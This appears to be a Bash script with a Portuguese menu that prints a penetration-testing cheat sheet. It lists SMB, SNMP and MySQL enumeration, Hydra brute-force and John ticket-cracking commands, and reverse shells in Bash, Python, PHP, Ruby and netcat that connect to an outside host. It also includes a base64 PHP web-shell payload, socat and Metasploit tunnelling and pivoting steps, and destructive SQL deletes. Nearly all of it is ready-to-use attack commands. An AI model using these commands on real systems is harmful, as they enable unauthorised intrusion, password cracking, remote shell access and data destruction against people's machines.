#!/bin/bash

clear

echo""
echo""
echo -e "\e[36m░█▄█░█▀█░█▀█░░░░░█▀█░█▀█░░░░░█▀▄░█▀█░█▀▄░█▀█\e[0m"
echo -e "\e[36m░█░█░█▀█░█░█░▄▄▄░█░█░█▀█░▄▄▄░█▀▄░█░█░█░█░█▀█\e[0m"
echo -e "\e[36m░▀░▀░▀░▀░▀▀▀░░░░░▀░▀░▀░▀░░░░░▀░▀░▀▀▀░▀▀░░▀░▀\e[0m"
echo""
echo""

while : 
do

	echo "Selecione o comando que precisa!"

	echo -e "\e[32m 1- SMB comands\e[0m"
	echo -e "\e[32m 2- RPC comands\e[0m"
	echo -e "\e[32m 3- SMTP comands\e[0m"
	echo -e "\e[32m 4- SNMP comands\e[0m"
	echo -e "\e[32m 5- MYSQL comands\e[0m"
	echo -e "\e[32m 6- Hydra comands\e[0m"
	echo -e "\e[32m 7- JOHN comands\e[0m"
	echo -e "\e[32m 8- SHELL diversas\e[0m"
	echo -e "\e[32m 9- Melhor shell\e[0m"
	echo -e "\e[32m a- PHP  Wrappers\e[0m"
	echo -e "\e[32m b- Tunelamento\e[0m"
	echo -e "\e[32m c- Pivontig\e[0m"
	echo -e "\e[31m 0- sair\e[0m"

	read -n1 -p 'Opção: ' OPCAO

	case $OPCAO  in 

	1) #OPCAO  
	echo""
	echo""
echo -e '1: '  "\e[36mcomando de listagem --->\e[0m"  "smbclient -L //192.168.1.254// -U  testee"
	echo""
echo -e '2: ' "\e[36mcomando para conectar a repositorio encontrado -->\e[0m" "smbclient //192.168.1.254//ADMIN$ -U gdh"
	echo""
echo -e '3:' "\e[36mmontando um dos compartilhamentos econtrados -->\e[0m""mount -t smbfs //servidor/arquivos /mnt/smb"
	echo""
echo -e '4:' "\e[36mpassando senha e user para montar -->\e[0m" "mount -t smbfs //servidor/arquivos /mnt/smb -o username=gdh,password=1234"
	echo""
	

	;;

	2) #OPCAO 
        echo""
        echo""
echo -e '1: '  "\e[36mPara listar todos os privilégios disponíveis e seus proprietários -->\e[0m""net rpc rights list -U "DOMAIN\\administrator""
        echo""
echo -e '2: ' "\e[36mconectar ao rdp -->\e[0m" "xfreerdp +clipboard /u:<username> /v:<hostname> /size:<WxH>"
     	echo""
	   ;;
	3) #OPCAO
        echo""
        echo""

echo -e '1: '  "\e[36mComands smtp -->\e[0m""abrir comunicação = telnet ip -p port"
		echo""
echo -e '2: '  "\e[36mComands smtp -->\e[0m""OPEN mail1.fabrikam.com 25"
        echo""
echo -e '3: ' "\e[36mComands smtp -->\e[0m" "EHLO contoso.com"
        echo""
echo -e '4:' "\e[36mComands smtp -->\e[0m""MAIL FROM:<chris@contoso.com>"
        echo""
echo -e '5:' "\e[36mComands smtp -->\e[0m" "RCPT TO:<kate@fabrikam.com> NOTIFY=success,failure"
        echo""
echo -e '6:' "\e[36mComands smtp -->\e[0m" "DATA"
        echo""
echo -e '7:' "\e[36mComands smtp -->\e[0m" "Digite o payload ou msg"
        echo""    
        ;;
	4) #OPCAO 
		echo""
        echo""

echo -e '1: '  "\e[36mComands snmp listagem -->\e[0m""snmpwalk -v1 'ip' -c 'community' "
		echo""
echo -e '2: '  "\e[36mComands snmp listagem -->\e[0m""snmp-check 'ip' -c 'communit'"	
        echo""
		;;

	5) #OPCAO  
        echo""
        echo""
echo -e '1: '  "\e[36mLogin mysql -->\e[0m""mysql -h NOME-DO-SERVIDOR -u NOME-DO-USUARIO"
		echo""
echo -e '2: '  "\e[36mVer todos bancos de dados -->\e[0m""SHOW DATABASES;"
		echo""
echo -e '4: '  "\e[36mVer todos tabelas -->\e[0m""SHOW tables;"
		echo""
echo -e '5: '  "\e[36mObter info sobre uma tabela -->\e[0m""DESCRIBE clientes;"
		echo""
echo -e '6: '  "\e[36mVer registros de uma tabela -->\e[0m""SELECT * FROM clientes;"
		echo""
echo -e '7: '  "\e[36mDeletar Registros de uma tabela -->\e[0m""DELETE FROM nome-da-tabela WHERE nome-da-coluna=texto;"
		echo""
echo -e '8: '  "\e[36mDeletar Registros completo de um banco -->\e[0m""DELETE FROM clientes WHERE nomeEmpresa = 'GameCorp';"
		echo""
echo -e '9: '  "\e[36mRemovendo tabela -->\e[0m""DROP TABLE nome-da-tabela;"
		echo""
echo -e '10: '  "\e[36mLimpando tabela -->\e[0m""TRUNCATE TABLE nome-da-tabela;"
		echo""
echo -e '11: '  "\e[36mAlterando Registro -->\e[0m""UPDATE clientes SET numEmpregados=1999 WHERE idCliente = 1;"
		echo""
		;;
	6) #OPCAO  
        echo""
        echo""
echo -e '1: '  "\e[36mHydra comando Post form -->\e[0m""hydra -l root -P wordlist.txt http-post-form “/:username=^USER^&password=^PASS^:F=incorrect” -V"
		echo""
echo -e '2: '  "\e[36mHydra ftp -->\e[0m""hydra -l user -P passlist.txt ftp://192.168.0.1" 
		echo""
echo -e '3: '  "\e[36mHydra ssh -->\e[0m""hydra -l <username> -P <full path to pass> <ip> -t 4 ssh"
		echo""
        ;;
	7) #OPCAO  
        echo""
		echo""  
echo -e '1: '  "\e[36mJohn comando basico -->\e[0m""john --format=krb5tgs ticket.txt --wordlist=rockyou.txt"
        echo""
		;;
	8) #OPCAO  
        echo""
		echo""  
echo -e '1: '  "\e[36mBash  -->\e[0m""bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
		echo""  
echo -e '2: '  "\e[36mPython -->\e[0m""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
		echo""  
echo -e '3: '  "\e[36mPHP -->\e[0m""php -r '$\sock=fsockopen('ip',1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
		echo""  
echo -e '4: '  "\e[36mRUBY -->\e[0m""ruby -rsocket -e'f=TCPSocket.open(\"ip\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
		echo""  
echo -e '5: '  "\e[36mNetcat -->\e[0m""nc -e /bin/sh 10.0.0.1 1234"
		echo""  
echo -e '6: '  "\e[36mXterm  -->\e[0m""xterm -display 10.0.0.1:1 obs:ele tentara se conectar na porta 6001, abra uma conecção com Xnest :1 , para listar na porta 6001"
		echo""
echo -e "\e[36mSITE: -->\e[0m"" https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" 		
		echo""
		;;
	9) #OPCAO  
        echo""  
        echo""
echo -e '1: '  "\e[36mMelhorar shell Python --->\e[0m""Python -c 'import pty; pty.spawn(\"/bin/bash\")'"
        echo""
		;;
	a) #OPCAO  
        echo""
		echo""  
echo -e '1: '  "\e[36mColocando payload zip -->\e[0m"" zip://<archivo zip>%23<archivo php> "

		echo""  
echo -e '2: '  "\e[36mData (RFC 2397) -->\e[0m"" data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA" "<--\e[45m payload em base 64\e[0m"

		echo""  
echo -e "\e[36mSite com mais info -->\e[0m"  " https://deephacking.tech/php-wrappers-pentesting-web/#data"

		echo""
        ;;
	b) #OPCAO  
        echo""  
        echo""  
echo -e '1: '  "\e[36mAbrindo socat na nossa maquina -->\e[0m"" socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr" "<--\e[45m abrindo port 8443 e ouvindo na 2222\e[0m"
echo -e '1: '  "\e[36mAbrindo na vitima e mandando para nossa maquina -->\e[0m" 'socat TCP4:nosso ip aqui:8443 TCP4:127.0.0.1:22' "<--\e[45m aqui eu to simulando q o ssh estava localmente, dessa forma a gente consegue ouvir na nossa maquina na porta 2222\e[0m"
		echo""
echo -e '1: '  "\e[36mUsando msfconsole para tunelar -->\e[0m"" portfwd add -l 110  -p 110 -r 10.10.20.4" "<--\e[45m aqui eu pegue o host q invadiram e o ip local da maquina dele e a porta que querem tunelar\e[0m"
echo -e '1: '  "\e[36mCorfimando abertura -->\e[0m" " Abra o terminal e digite netstat -nlpt e veja se a porta está aberta"

        echo""
		;;
	c) #OPCAO  
       echo""
	   echo""
	   echo "Usando metasploit :"
echo -e '1: '  "\e[36mAdicionando rota a rede  --->\e[0m"  "run autoroute -s 10.10.20.0/24" "<--\e[45m confirme se a rota foi criada com: run autoroute -p\e[0m "
echo -e '2: '  "\e[36musando modules auxiliary como proxy --->\e[0m"  "use auxiliary/server/socks4a" "<--\e[45m assim que rodar vai abrir um proxy na porta 1080\e[0m"
echo -e '3: '  "\e[36mInteragindo com a porta com proxychains --->\e[0m"  "nano /etc/proxychains.conf" "<--\e[45m adicione no final socks4 127.0.0.1 1080\e[0m"
echo -e '4: '  "\e[36mAgora so usar o proxychains --->\e[0m"  "proxychains nmap -v --open -p 80 -Pn 10.10.20.0/24" "<--\e[45m use sempre proxychains na frente e passe o comando\e[0m"
        echo""


		;;
	0) #Finalizar script
	echo "   Saindo......"
	exit 0
	;;
	*) #comando invalido
		echo "   comando invalido, escolha um numero correto"
	
	;;


	esac
done

echo " COntinuando a execução"
